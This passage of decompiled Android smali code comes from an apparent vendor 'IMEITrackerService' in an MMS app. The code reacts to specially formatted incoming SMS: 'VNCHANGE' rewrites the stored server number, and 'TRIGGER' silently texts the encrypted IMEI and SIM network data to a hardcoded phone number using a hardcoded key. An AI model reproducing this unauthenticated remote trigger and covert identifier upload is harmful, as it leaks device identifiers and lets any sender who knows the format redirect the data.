    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    invoke-virtual {v12, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    const-string v13, " "

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    const-string v13, "1"

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    const-string v13, " "

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    invoke-virtual {v12, v10}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v12

    const-string v13, " "

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    invoke-virtual {v12}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    .line 254
    .local v6, message:Ljava/lang/String;
    const-string v12, "phone"

    invoke-virtual {p0, v12}, Landroid/content/ContextWrapper;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v11

    check-cast v11, Landroid/telephony/TelephonyManager;

    .line 255
    .local v11, tm:Landroid/telephony/TelephonyManager;
    invoke-virtual {v11}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v0

    .line 257
    .local v0, IMEI:Ljava/lang/String;
    invoke-virtual {v11}, Landroid/telephony/TelephonyManager;->getNetworkOperator()Ljava/lang/String;

    move-result-object v9

    .line 259
    .local v9, operator:Ljava/lang/String;
    const/4 v5, 0x0

    .line 260
    .local v5, mcc:Ljava/lang/String;
    const/4 v7, 0x0

    .line 261
    .local v7, mnc:Ljava/lang/String;
    if-eqz v9, :cond_1

    invoke-virtual {v9}, Ljava/lang/String;->length()I

    move-result v12

    if-le v12, v14, :cond_1

    .line 262
    const/4 v12, 0x0

    invoke-virtual {v9, v12, v14}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v5

    .line 264
    invoke-virtual {v9, v14}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v7

    .line 267
    :cond_1
    new-instance v12, Ljava/lang/StringBuilder;

    invoke-direct {v12}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v12, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    invoke-virtual {v12, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    const-string v13, " "

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    invoke-virtual {v12, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    const-string v13, " "

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    invoke-virtual {v12, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    const-string v13, " "

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    const-string v13, "1"

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    invoke-virtual {v12}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    .line 269
    return-object v6
.end method

.method public getserverNumber()Ljava/lang/String;
    .locals 5

    .prologue
    .line 502
    const/4 v0, 0x0

    .line 504
    .local v0, otherAppsContext:Landroid/content/Context;
    :try_start_0
    const-string v3, "com.sec.android.app.servicemodeapp"

    const/4 v4, 0x0

    invoke-virtual {p0, v3, v4}, Landroid/content/ContextWrapper;->createPackageContext(Ljava/lang/String;I)Landroid/content/Context;
    :try_end_0
    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v0

    .line 507
    :goto_0
    const-string v1, "NULL"

    .line 508
    .local v1, serverNumber_saved:Ljava/lang/String;
    if-eqz v0, :cond_0

    .line 509
    const-string v3, "imeiServerNo"

    const/4 v4, 0x3

    invoke-virtual {v0, v3, v4}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v2

    .line 510
    .local v2, setting2:Landroid/content/SharedPreferences;
    const-string v3, "serverNo"

    const-string v4, "NULL"

    invoke-interface {v2, v3, v4}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 512
    .end local v2           #setting2:Landroid/content/SharedPreferences;
    :cond_0
    return-object v1

    .line 505
    .end local v1           #serverNumber_saved:Ljava/lang/String;
    :catch_0
    move-exception v3

    goto :goto_0
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    .parameter "intent"

    .prologue
    .line 602
    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 3

    .prologue
    .line 83
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    .line 84
    const-string v1, "ITS"

    const-string v2, "onCreate"

    invoke-static {v1, v2}, Lcom/android/mms/Log;->i(Ljava/lang/String;Ljava/lang/String;)V

    .line 85
    new-instance v0, Ljava/lang/Thread;

    const/4 v1, 0x0

    const-string v2, "IMEITrackerService"

    invoke-direct {v0, v1, p0, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/ThreadGroup;Ljava/lang/Runnable;Ljava/lang/String;)V

    .line 86
    .local v0, serviceThread:Ljava/lang/Thread;
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    .line 87
    invoke-virtual {p0}, Landroid/content/ContextWrapper;->getBaseContext()Landroid/content/Context;

    move-result-object v1

    iput-object v1, p0, Lcom/android/mms/transaction/IMEITrackerService;->mContext:Landroid/content/Context;

    .line 88
    sput-object p0, Lcom/android/mms/transaction/IMEITrackerService;->sInstance:Lcom/android/mms/transaction/IMEITrackerService;

    .line 89
    return-void
.end method

.method public onDestroy()V
    .locals 2

    .prologue
    .line 595
    const-string v0, "ITS"

    const-string v1, "onDestroy"

    invoke-static {v0, v1}, Lcom/android/mms/Log;->i(Ljava/lang/String;Ljava/lang/String;)V

    .line 596
    invoke-direct {p0}, Lcom/android/mms/transaction/IMEITrackerService;->waitForLooper()V

    .line 597
    iget-object v0, p0, Lcom/android/mms/transaction/IMEITrackerService;->mServiceLooper:Landroid/os/Looper;

    invoke-virtual {v0}, Landroid/os/Looper;->quit()V

    .line 598
    return-void
.end method

.method public onStart(Landroid/content/Intent;I)V
    .locals 26
    .parameter "intent"
    .parameter "startId"

    .prologue
    .line 94
    const-string v23, "ITS"

    const-string v24, "onStart"

    invoke-static/range {v23 .. v24}, Lcom/android/mms/Log;->i(Ljava/lang/String;Ljava/lang/String;)V

    .line 95
    invoke-direct/range {p0 .. p0}, Lcom/android/mms/transaction/IMEITrackerService;->waitForLooper()V

    .line 96
    if-nez p1, :cond_1

    .line 201
    :cond_0
    :goto_0
    return-void

    .line 99
    :cond_1
    invoke-virtual/range {p1 .. p1}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v4

    .line 100
    .local v4, args:Landroid/os/Bundle;
    if-eqz v4, :cond_0

    .line 103
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/mms/transaction/IMEITrackerService;->mServiceHandler:Lcom/android/mms/transaction/IMEITrackerService$ServiceHandler;

    move-object/from16 v23, v0

    invoke-virtual/range {v23 .. v23}, Landroid/os/Handler;->obtainMessage()Landroid/os/Message;

    move-result-object v12

    .line 104
    .local v12, msg:Landroid/os/Message;
    const-string v23, "op"

    move-object/from16 v0, v23

    invoke-virtual {v4, v0}, Landroid/os/Bundle;->getInt(Ljava/lang/String;)I

    move-result v23

    move/from16 v0, v23

    iput v0, v12, Landroid/os/Message;->arg1:I

    .line 105
    new-instance v23, Ljava/util/ArrayList;

    invoke-direct/range {v23 .. v23}, Ljava/util/ArrayList;-><init>()V

    move-object/from16 v0, v23

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/mms/transaction/IMEITrackerService;->insertedSimRecordList:Ljava/util/ArrayList;

    .line 107
    const/16 v19, 0x1

    .local v19, simInsertionOrder:I
    :goto_1
    const/16 v23, 0x5

    move/from16 v0, v19

    move/from16 v1, v23

    if-gt v0, v1, :cond_2

    .line 108
    move-object/from16 v0, p0

    move/from16 v1, v19

    invoke-direct {v0, v1}, Lcom/android/mms/transaction/IMEITrackerService;->getIMSI(I)Ljava/lang/String;

    move-result-object v3

    .line 109
    .local v3, IMSI_saved:Ljava/lang/String;
    const-string v23, "NULL"

    move-object/from16 v0, v23

    invoke-virtual {v3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v23

    if-nez v23, :cond_2

    .line 110
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/mms/transaction/IMEITrackerService;->insertedSimRecordList:Ljava/util/ArrayList;

    move-object/from16 v23, v0

    move-object/from16 v0, v23

    invoke-virtual {v0, v3}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 107
    add-int/lit8 v19, v19, 0x1

    goto :goto_1

    .line 116
    .end local v3           #IMSI_saved:Ljava/lang/String;
    :cond_2
    iget v0, v12, Landroid/os/Message;->arg1:I

    move/from16 v23, v0

    packed-switch v23, :pswitch_data_0

    goto :goto_0

    .line 118
    :pswitch_0
    const-string v23, "phone"

    move-object/from16 v0, p0

    move-object/from16 v1, v23

    invoke-virtual {v0, v1}, Landroid/content/ContextWrapper;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v20

    check-cast v20, Landroid/telephony/TelephonyManager;

    .line 119
    .local v20, tm1:Landroid/telephony/TelephonyManager;
    new-instance v11, Lcom/android/mms/transaction/IMEITrackerService$MyListner;

    const/16 v23, 0x0

    move-object/from16 v0, p0

    move-object/from16 v1, v23

    invoke-direct {v11, v0, v1}, Lcom/android/mms/transaction/IMEITrackerService$MyListner;-><init>(Lcom/android/mms/transaction/IMEITrackerService;Lcom/android/mms/transaction/IMEITrackerService$1;)V

    .line 120
    .local v11, ml:Lcom/android/mms/transaction/IMEITrackerService$MyListner;
    const/16 v23, 0x1

    move-object/from16 v0, v20

    move/from16 v1, v23

    invoke-virtual {v0, v11, v1}, Landroid/telephony/TelephonyManager;->listen(Landroid/telephony/PhoneStateListener;I)V

    goto :goto_0

    .line 124
    .end local v11           #ml:Lcom/android/mms/transaction/IMEITrackerService$MyListner;
    .end local v20           #tm1:Landroid/telephony/TelephonyManager;
    :pswitch_1
    invoke-static/range {p1 .. p1}, Lcom/android/mms/transaction/IMEITrackerService;->getMessagesFromIntent(Landroid/content/Intent;)[Landroid/telephony/SmsMessage;

    move-result-object v10

    .line 125
    .local v10, messages:[Landroid/telephony/SmsMessage;
    if-eqz v10, :cond_0

    .line 128
    array-length v0, v10

    move/from16 v23, v0

    if-lez v23, :cond_0

    .line 130
    const/16 v23, 0x0

    aget-object v23, v10, v23

    invoke-virtual/range {v23 .. v23}, Landroid/telephony/SmsMessage;->getMessageBody()Ljava/lang/String;

    move-result-object v23

    const/16 v24, 0x0

    invoke-virtual/range {v23 .. v24}, Ljava/lang/String;->charAt(I)C

    move-result v23

    invoke-static/range {v23 .. v23}, Ljava/lang/String;->valueOf(C)Ljava/lang/String;

    move-result-object v15

    .line 134
    .local v15, s:Ljava/lang/String;
    const/16 v23, 0x0

    :try_start_0
    move/from16 v0, v23

    invoke-virtual {v15, v0}, Ljava/lang/String;->charAt(I)C

    move-result v23

    invoke-static/range {v23 .. v23}, Ljava/lang/Integer;->toHexString(I)Ljava/lang/String;

    move-result-object v6

    .line 137
    .local v6, firstByteInHex:Ljava/lang/String;
    const/16 v7, 0x1c

    .line 140
    .local v7, hexCheck:I
    const-string v21, "0x00C6"

    .line 141
    .local v21, unicode1:Ljava/lang/String;
    const-string v22, "C6"

    .line 146
    .local v22, unicode2:Ljava/lang/String;
    move-object/from16 v0, v21

    invoke-virtual {v6, v0}, Ljava/lang/String;->compareToIgnoreCase(Ljava/lang/String;)I

    move-result v23

    if-eqz v23, :cond_3

    move-object/from16 v0, v22

    invoke-virtual {v6, v0}, Ljava/lang/String;->compareToIgnoreCase(Ljava/lang/String;)I

    move-result v23

    if-nez v23, :cond_0

    .line 149
    :cond_3
    const/16 v23, 0x0

    aget-object v23, v10, v23

    invoke-virtual/range {v23 .. v23}, Landroid/telephony/SmsMessage;->getMessageBody()Ljava/lang/String;

    move-result-object v14

    .line 150
    .local v14, receivedSMS:Ljava/lang/String;
    invoke-virtual {v14}, Ljava/lang/String;->length()I

    move-result v8

    .line 157
    .local v8, len:I
    const/16 v23, 0xa

    move/from16 v0, v23

    if-le v8, v0, :cond_4

    .line 158
    const/16 v23, 0x2

    const/16 v24, 0xa

    move/from16 v0, v23

    move/from16 v1, v24

    invoke-virtual {v14, v0, v1}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v16

    .line 159
    .local v16, s1:Ljava/lang/String;
    const-string v23, "VNCHANGE"

    move-object/from16 v0, v16

    move-object/from16 v1, v23

    invoke-virtual {v0, v1}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v23

    if-eqz v23, :cond_0

    .line 160
    const-string v23, "ITS"

    const-string v24, "VNCHANGE message"

    invoke-static/range {v23 .. v24}, Lcom/android/mms/Log;->i(Ljava/lang/String;Ljava/lang/String;)V

    .line 161
    const/16 v23, 0xa

    move/from16 v0, v23

    invoke-virtual {v14, v0, v8}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v23

    invoke-virtual/range {v23 .. v23}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v13

    .line 164
    .local v13, number:Ljava/lang/String;
    move-object/from16 v0, p0

    invoke-direct {v0, v13}, Lcom/android/mms/transaction/IMEITrackerService;->updateServerNumbToLocalSharePref(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/NumberFormatException; {:try_start_0 .. :try_end_0} :catch_0

    goto/16 :goto_0

    .line 192
    .end local v6           #firstByteInHex:Ljava/lang/String;
    .end local v7           #hexCheck:I
    .end local v8           #len:I
    .end local v13           #number:Ljava/lang/String;
    .end local v14           #receivedSMS:Ljava/lang/String;
    .end local v16           #s1:Ljava/lang/String;
    .end local v21           #unicode1:Ljava/lang/String;
    .end local v22           #unicode2:Ljava/lang/String;
    :catch_0
    move-exception v5

    .line 193
    .local v5, e:Ljava/lang/NumberFormatException;
    const-string v23, "ITS"

    new-instance v24, Ljava/lang/StringBuilder;

    invoke-direct/range {v24 .. v24}, Ljava/lang/StringBuilder;-><init>()V

    const-string v25, "NumberFormatException : "

    invoke-virtual/range {v24 .. v25}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v24

    move-object/from16 v0, v24

    invoke-virtual {v0, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v24

    invoke-virtual/range {v24 .. v24}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v24

    invoke-static/range {v23 .. v24}, Lcom/android/mms/Log;->i(Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_0

    .line 169
    .end local v5           #e:Ljava/lang/NumberFormatException;
    .restart local v6       #firstByteInHex:Ljava/lang/String;
    .restart local v7       #hexCheck:I
    .restart local v8       #len:I
    .restart local v14       #receivedSMS:Ljava/lang/String;
    .restart local v21       #unicode1:Ljava/lang/String;
    .restart local v22       #unicode2:Ljava/lang/String;
    :cond_4
    const/16 v23, 0x9

    move/from16 v0, v23

    if-ne v8, v0, :cond_0

    .line 170
    const/16 v23, 0x2

    const/16 v24, 0x9

    :try_start_1
    move/from16 v0, v23

    move/from16 v1, v24

    invoke-virtual {v14, v0, v1}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v17

    .line 171
    .local v17, s2:Ljava/lang/String;
    const-string v23, "TRIGGER"

    move-object/from16 v0, v17

    move-object/from16 v1, v23

    invoke-virtual {v0, v1}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v23

    if-eqz v23, :cond_0

    .line 172
    const-string v23, "ITS"

    const-string v24, "TRIGGER message"

    invoke-static/range {v23 .. v24}, Lcom/android/mms/Log;->i(Ljava/lang/String;Ljava/lang/String;)V

    .line 174
    invoke-direct/range {p0 .. p0}, Lcom/android/mms/transaction/IMEITrackerService;->getServerNumbFromLocalSharePref()Ljava/lang/String;

    move-result-object v18

    .line 175
    .local v18, serverNumber:Ljava/lang/String;
    const-string v23, "NULL"

    move-object/from16 v0, v18

    move-object/from16 v1, v23

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v23

    if-eqz v23, :cond_5

    .line 176
    const-string v18, "+919560345888"

    .line 177
    const-string v23, "+919560345888"

    move-object/from16 v0, p0

    move-object/from16 v1, v23

    invoke-direct {v0, v1}, Lcom/android/mms/transaction/IMEITrackerService;->updateServerNumbToLocalSharePref(Ljava/lang/String;)V

    .line 179
    :cond_5
    invoke-virtual/range {p0 .. p0}, Lcom/android/mms/transaction/IMEITrackerService;->createMessage()Ljava/lang/String;
    :try_end_1
    .catch Ljava/lang/NumberFormatException; {:try_start_1 .. :try_end_1} :catch_0

    move-result-object v9

    .line 181
    .local v9, message:Ljava/lang/String;
    :try_start_2
    const-string v23, "samsungimeitrack"

    move-object/from16 v0, v23

    invoke-static {v0, v9}, Lcom/android/mms/transaction/IMEITrackerService;->encrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v23

    sput-object v23, Lcom/android/mms/transaction/IMEITrackerService;->message_encrypted:Ljava/lang/String;
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1
    .catch Ljava/lang/NumberFormatException; {:try_start_2 .. :try_end_2} :catch_0

    .line 187
    :goto_2
    const/16 v23, 0x1

    :try_start_3
    sput v23, Lcom/android/mms/transaction/IMEITrackerService;->msgSendingAttempt:I

    .line 188
    new-instance v23, Ljava/lang/StringBuilder;

    invoke-direct/range {v23 .. v23}, Ljava/lang/StringBuilder;-><init>()V

    const-string v24, "IMEI "

    invoke-virtual/range {v23 .. v24}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v23

    sget-object v24, Lcom/android/mms/transaction/IMEITrackerService;->message_encrypted:Ljava/lang/String;

    invoke-virtual/range {v23 .. v24}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v23

    invoke-virtual/range {v23 .. v23}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v23

    move-object/from16 v0, p0

    move-object/from16 v1, v18

    move-object/from16 v2, v23

    invoke-direct {v0, v1, v2}, Lcom/android/mms/transaction/IMEITrackerService;->sendSMS(Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_0

    .line 182
    :catch_1
    move-exception v5

    .line 183
    .local v5, e:Ljava/lang/Exception;
    const-string v23, "ITS"

    const-string v24, "exception found"

    invoke-static/range {v23 .. v24}, Lcom/android/mms/Log;->i(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_3
    .catch Ljava/lang/NumberFormatException; {:try_start_3 .. :try_end_3} :catch_0

    goto :goto_2

    .line 116
    :pswitch_data_0
    .packed-switch 0x1
        :pswitch_0
        :pswitch_1
    .end packed-switch
.end method

.method public run()V
    .locals 2

    .prologue
    .line 606
    const-string v0, "ITS"

    const-string v1, "run"

    invoke-static {v0, v1}, Lcom/android/mms/Log;->i(Ljava/lang/String;Ljava/lang/String;)V

    .line 607
    invoke-static {}, Landroid/os/Looper;->prepare()V

    .line 608
    invoke-static {}, Landroid/os/Looper;->myLooper()Landroid/os/Looper;

    move-result-object v0

    iput-object v0, p0, Lcom/android/mms/transaction/IMEITrackerService;->mServiceLooper:Landroid/os/Looper;

    .line 609
    new-instance v0, Lcom/android/mms/transaction/IMEITrackerService$ServiceHandler;

    const/4 v1, 0x0

    invoke-direct {v0, p0, v1}, Lcom/android/mms/transaction/IMEITrackerService$ServiceHandler;-><init>(Lcom/android/mms/transaction/IMEITrackerService;Lcom/android/mms/transaction/IMEITrackerService$1;)V

    iput-object v0, p0, Lcom/android/mms/transaction/IMEITrackerService;->mServiceHandler:Lcom/android/mms/transaction/IMEITrackerService$ServiceHandler;

    .line 610
    invoke-static {}, Landroid/os/Looper;->loop()V

    .line 611
    return-void
.end method

.method public updateSeverNumber(Ljava/lang/String;)V
    .locals 5
    .parameter "severnumber"

    .prologue
    .line 488
    const/4 v0, 0x0

    .line 490
    .local v0, otherAppsContext:Landroid/content/Context;
    :try_start_0
    const-string v3, "com.sec.android.app.servicemodeapp"

    const/4 v4, 0x0

    invoke-virtual {p0, v3, v4}, Landroid/content/ContextWrapper;->createPackageContext(Ljava/lang/String;I)Landroid/content/Context;
    :try_end_0
    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v0

    .line 493
    :goto_0
    if-eqz v0, :cond_0

    .line 494
    const-string v3, "imeiServerNo"

    const/4 v4, 0x3

    invoke-virtual {v0, v3, v4}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v2

    .line 495
    .local v2, setting2:Landroid/content/SharedPreferences;
    invoke-interface {v2}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v1

    .line 496
    .local v1, prefEditor:Landroid/content/SharedPreferences$Editor;
    const-string v3, "KEY_READ_WRITE"

    invoke-interface {v1, v3, p1}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 497
    invoke-interface {v1}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 499
    .end local v1           #prefEditor:Landroid/content/SharedPreferences$Editor;
    .end local v2           #setting2:Landroid/content/SharedPreferences;
    :cond_0
    return-void

    .line 491
    :catch_0
    move-exception v3

    goto :goto_0
.end method
